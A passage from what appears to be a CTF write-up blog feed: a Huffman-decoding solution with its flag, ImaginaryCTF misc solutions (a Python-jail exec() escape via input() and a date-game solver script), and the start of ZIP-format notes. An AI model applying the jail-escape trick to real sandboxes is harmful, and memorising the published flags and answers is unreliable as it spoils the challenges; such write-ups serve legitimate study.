class="hljs-string">&#x27;1101&#x27;</span>,<span class="hljs-string">&#x27;1100&#x27;</span>,<span class="hljs-string">&#x27;1011&#x27;</span>,<span class="hljs-string">&#x27;1101&#x27;</span>,<span class="hljs-string">&#x27;00001&#x27;</span>,<span class="hljs-string">&#x27;01100&#x27;</span>,<span class="hljs-string">&#x27;01001&#x27;</span>,<span class="hljs-string">&#x27;01101&#x27;</span>,<span class="hljs-string">&#x27;1101&#x27;</span>,<span class="hljs-string">&#x27;1010&#x27;</span>,<span class="hljs-string">&#x27;1100&#x27;</span>,<span class="hljs-string">&#x27;1010&#x27;</span>,<span class="hljs-string">&#x27;01010&#x27;</span>,<span class="hljs-string">&#x27;01110&#x27;</span>,<span class="hljs-string">&#x27;1100&#x27;</span>,<span class="hljs-string">&#x27;111&#x27;</span>,<span class="hljs-string">&#x27;01111&#x27;</span>,<span class="hljs-string">&#x27;1001&#x27;</span>,<span class="hljs-string">&#x27;00011&#x27;</span>,<span class="hljs-string">&#x27;111&#x27;</span>,<span class="hljs-string">&#x27;01111&#x27;</span>,<span class="hljs-string">&#x27;111&#x27;</span>,<span class="hljs-string">&#x27;00000&#x27;</span>]<br>a = &#123;<span class="hljs-string">&#x27;&#125;&#x27;</span>:<span class="hljs-string">&quot;00000&quot;</span>,<span class="hljs-string">&#x27;c&#x27;</span>:<span class="hljs-string">&quot;00001&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>:<span class="hljs-string">&quot;00010&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>:<span class="hljs-string">&quot;00011&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>:<span class="hljs-string">&quot;00100&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-string">&quot;00101&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-string">&quot;00110&quot;</span>,<span class="hljs-string">&quot;&#123;&quot;</span>:<span class="hljs-string">&quot;00111&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>:<span class="hljs-string">&quot;01000&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;01001&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>:<span class="hljs-string">&quot;01010&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>:<span class="hljs-string">&quot;01011&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>:<span class="hljs-string">&quot;01100&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;01101&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>:<span class="hljs-string">&quot;01110&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>:<span class="hljs-string">&quot;01111&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;1000&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-string">&quot;1001&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;1010&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-string">&quot;1011&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>:<span class="hljs-string">&quot;1100&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>:<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-attr">d</span>:<br>    <span class="hljs-title function_">print</span>(<span class="hljs-title function_">get_key</span>(a,i)[<span class="hljs-number">0</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>#<span class="hljs-variable constant_">BDSEC</span>&#123;<span class="hljs-title class_">Huffm</span>@n_Enc0d1ng_go7_D3COD3D&#125;<br></code></pre></td></tr></table></figure><p><img src="/../imgs/20220722BDSEC/image-20220803100844464.png" alt="image-20220803100844464"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-Imaginary-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/07/19/20220719ICTF/"/>
    <id>https://www.imfengyuan.info/2022/07/19/20220719ICTF/</id>
    <published>2022-07-19T22:19:23.000Z</published>
    <updated>2022-07-19T22:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pyprison"><a href="#pyprison" class="headerlink" title="pyprison"></a>pyprison</h1><p>Source Code:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx">#!<span class="hljs-regexp">/usr/</span>bin/env python3<br><br><span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:<br>  a = <span class="hljs-title function_">input</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>  assert <span class="hljs-title function_">all</span>(n <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;()abcdefghijklmnopqrstuvwxyz&quot;</span> <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> a)<br>  <span class="hljs-title function_">exec</span>(a)<br></code></pre></td></tr></table></figure><p>Input() Bypass variable a </p><p><img src="/../imgs/20220719ICTF/image-20220803101139804.png" alt="image-20220803101139804"></p><h1 id="neoannophobia"><a href="#neoannophobia" class="headerlink" title="neoannophobia"></a>neoannophobia</h1><p>Assign: K3, sh水函 Mr<br>Status: Completed<br>Tag: Misc</p><p>Game Description</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">== proof-of-work: disabled ==</span><br>Welcome to neoannophobia, where we are so scared of New Year&#x27;s that we race to New Year&#x27;s eve!<br><br>In this game, two players take turns saying days of the year (&quot;January 30&quot;, &quot;July 5&quot;, etc)<br><br>The first player may start with any day in the month of January, and on each turn a player may say another date that either has the same month or the same day as the previous date. You can also only progress forward in time, never backwards.<br><br>For example, this is a valid series of moves:<br><br>Player 1: January 1<br>Player 2: February 1<br>Player 1: February 9<br>Player 2: July 9<br>Player 1: July 14<br>Player 2: July 30<br>Player 1: December 30<br>Player 2: December 31<br><br>This is an illegal set of moves:<br><br>Player 1: January 1<br>Player 2: July 29 (not same day or month)<br>Player 1: July 1 (going backwards in time)<br><br>The objective of the game is simple: be the first player to say December 31.<br><br>The computer will choose its own moves, and will always go first. To get the flag, you must win against the computer 100 times in a row.<br><br>Ready? You may begin.<br><br><span class="hljs-code">----------</span><br><span class="hljs-code">ROUND 1</span><br><span class="hljs-code">----------</span><br>January 9<br>&gt;January 20<br><span class="hljs-code"> August 20</span><br>&gt;August 27<br><span class="hljs-code"> August 30</span><br>&gt;November 30<br><span class="hljs-code"> November 31</span><br>&gt;December 31<br><span class="hljs-section"> You won!</span><br><span class="hljs-section">----------</span><br><span class="hljs-section">ROUND 2</span><br><span class="hljs-section">----------</span><br>January 29<br>&gt;October 29<br></code></pre></td></tr></table></figure><p>Python Script  （脚本丑死了）</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> binascii<br><br>r = <span class="hljs-number">1</span><br>month = [<span class="hljs-string">&#x27;January&#x27;</span>, <span class="hljs-string">&#x27;February&#x27;</span>, <span class="hljs-string">&#x27;March&#x27;</span>, <span class="hljs-string">&#x27;April&#x27;</span>, <span class="hljs-string">&#x27;May&#x27;</span>, <span class="hljs-string">&#x27;June&#x27;</span>, <span class="hljs-string">&#x27;July&#x27;</span>, <span class="hljs-string">&#x27;August&#x27;</span>, <span class="hljs-string">&#x27;September&#x27;</span>, <span class="hljs-string">&#x27;October&#x27;</span>, <span class="hljs-string">&#x27;November&#x27;</span>, <span class="hljs-string">&#x27;December&#x27;</span>]<br><br>io = <span class="hljs-title function_">zio</span>((<span class="hljs-string">&#x27;neoannophobia.chal.imaginaryctf.org&#x27;</span>,<span class="hljs-number">1337</span>))<br>io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;ROUND &#x27;</span> + <span class="hljs-title function_">str</span>(r) + <span class="hljs-string">&#x27;\n----------&#x27;</span>)<br>t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br><span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:<br><br>#每个月都有一个特征日期<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">20</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;January&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;January&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">20</span> ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;January &#x27;</span>+b<span class="hljs-string">&#x27;20&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">21</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;February&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;February&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">21</span> ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;February &#x27;</span>+b<span class="hljs-string">&#x27;21&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">22</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;March&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;March&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">22</span> ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;March &#x27;</span>+b<span class="hljs-string">&#x27;22&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">23</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;April&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;April&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">23</span> ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;April &#x27;</span>+b<span class="hljs-string">&#x27;23&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">24</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;May&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;May&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">24</span>  ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;May &#x27;</span>+b<span class="hljs-string">&#x27;24&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>        <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">25</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;June&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;June&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">25</span>):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;June &#x27;</span>+b<span class="hljs-string">&#x27;25&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>        <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">26</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;July&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;July&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">26</span>) :<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;July &#x27;</span>+b<span class="hljs-string">&#x27;26&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>        <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">27</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;August&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;August&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">27</span> ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;August &#x27;</span>+b<span class="hljs-string">&#x27;27&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">28</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;September&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;September&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">28</span> ):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;September &#x27;</span>+b<span class="hljs-string">&#x27;28&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>        <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">29</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;October&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()))or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;October&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">29</span>) :<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;October &#x27;</span>+b<span class="hljs-string">&#x27;29&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">30</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;November&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())) or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;November&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">30</span>):<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;November &#x27;</span>+b<span class="hljs-string">&#x27;30&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">31</span> and month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;December&#x27;</span>) &gt; month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()))or (month.<span class="hljs-title function_">index</span>(<span class="hljs-string">&#x27;December&#x27;</span>) == month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>()) and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">31</span>) :<br>        io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;December &#x27;</span>+b<span class="hljs-string">&#x27;31&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        r = r + <span class="hljs-number">1</span><br>        io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;ROUND &#x27;</span> + <span class="hljs-title function_">str</span>(r) + <span class="hljs-string">&#x27;\n----------&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-title function_">print</span>(t)<br>        <span class="hljs-keyword">continue</span><br>        <br>    #小于<span class="hljs-number">10</span>月 小于 <span class="hljs-number">29</span> 就一个月一个月网上堆（唯一的bug就是第一次是<span class="hljs-number">1</span>月<span class="hljs-number">20</span>号，但是计算机随机，所以随便应付一下就会改变，有很多次机会）<br>    <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] != b<span class="hljs-string">&#x27;October&#x27;</span> and t[<span class="hljs-number">0</span>] != b<span class="hljs-string">&#x27;November&#x27;</span>  and t[<span class="hljs-number">0</span>] != b<span class="hljs-string">&#x27;December&#x27;</span> and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">29</span>:<br>        <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == b<span class="hljs-string">&#x27;January&#x27;</span> and <span class="hljs-title function_">int</span>(t[<span class="hljs-number">1</span>]) == <span class="hljs-number">28</span> :<br>            io.<span class="hljs-title function_">write</span>(b<span class="hljs-string">&#x27;May &#x27;</span>+b<span class="hljs-string">&#x27;28&#x27;</span>+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-attr">else</span>:<br>            io.<span class="hljs-title function_">write</span>(month[month.<span class="hljs-title function_">index</span>(t[<span class="hljs-number">0</span>].<span class="hljs-title function_">decode</span>())+<span class="hljs-number">1</span>].<span class="hljs-title function_">encode</span>() + b<span class="hljs-string">&#x27; &#x27;</span>+t[<span class="hljs-number">1</span>]+b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        t = io.<span class="hljs-title function_">read_until</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)[:].<span class="hljs-title function_">strip</span>().<span class="hljs-title function_">split</span>()<br>        <span class="hljs-title function_">print</span>(t)<br></code></pre></td></tr></table></figure><p>Flag</p><p><img src="/../imgs/20220719ICTF/image-20220803101242321.png" alt="image-20220803101242321"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="ctfwp" scheme="https://www.imfengyuan.info/categories/ctfwp/"/>
    
    
  </entry>
  
  <entry>
    <title>MISC- Compression_Series-StudyNotes-2.ZIP原理</title>
    <link href="https://www.imfengyuan.info/2022/07/13/ZIP-ORIGIN-1/"/>
    <id>https://www.imfengyuan.info/2022/07/13/ZIP-ORIGIN-1/</id>
    <published>2022-07-13T08:41:16.000Z</published>
    <updated>2022-07-12T22:23:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC-Compression-Series-StudyNotes-2-ZIP原理剖析"><a href="#MISC-Compression-Series-StudyNotes-2-ZIP原理剖析" class="headerlink" title="MISC- Compression_Series-StudyNotes-2.ZIP原理剖析"></a>MISC- Compression_Series-StudyNotes-2.ZIP原理剖析</h1><h2 id="1-ZIP介绍"><a href="#1-ZIP介绍" class="headerlink" title="1.ZIP介绍"></a>1.ZIP介绍</h2><p>发明人和时间：Phil Katz、1989年1月，原名Deflate</p><p>历史：<a href="https://zh.wikipedia.org/wiki/ZIP%E6%A0%BC%E5%BC%8F">https://zh.wikipedia.org/wiki/ZIP%E6%A0%BC%E5%BC%8F</a></p><blockquote><p>ZIP的规约指出文件可以不经压缩或者使用不同的压缩算法来存储。然而，在实际上，ZIP几乎差不多总是在使用<a href="https://zh.wikipedia.org/wiki/%E8%8F%B2%E5%B0%94%C2%B7%E5%8D%A1%E8%8C%A8">卡茨</a>（Katz）的<a href="https://zh.wikipedia.org/wiki/DEFLATE">DEFLATE</a>算法。</p><p>ZIP支持基于对称加密系统的一个简单的密码，现在已知有严重的缺陷，存在<a href="https://zh.wikipedia.org/wiki/%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB">已知明文攻击</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB">字典攻击</a>和<a href="https://zh.wikipedia.org/wiki/%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB">暴力攻击</a>。ZIP也支持分卷压缩。</p></blockquote><p>就引言而言，本文主要介绍基于DEFLATE压缩方法的ZIP文件。其他压缩方法见wiki百科。</p><p>官方文档：<a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt">https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt</a></p><h2 id="2-ZIP格式介绍"><a href="#2-ZIP格式介绍" class="headerlink" title="2.ZIP格式介绍"></a>2.ZIP格式介绍</h2><p>在MISC比赛过程中，为便于操作，通常会使用010 editor的Template功能进行格式分析，但有时会因为隐写会导致格式破坏</p><p><img src="/../imgs/ZIP-ORIGIN-1/image-20220713094720365.png" alt="image-20220713094720365"></p><p><img src="/../imgs/ZIP-ORIGIN-1/image-20220713222653529.png" 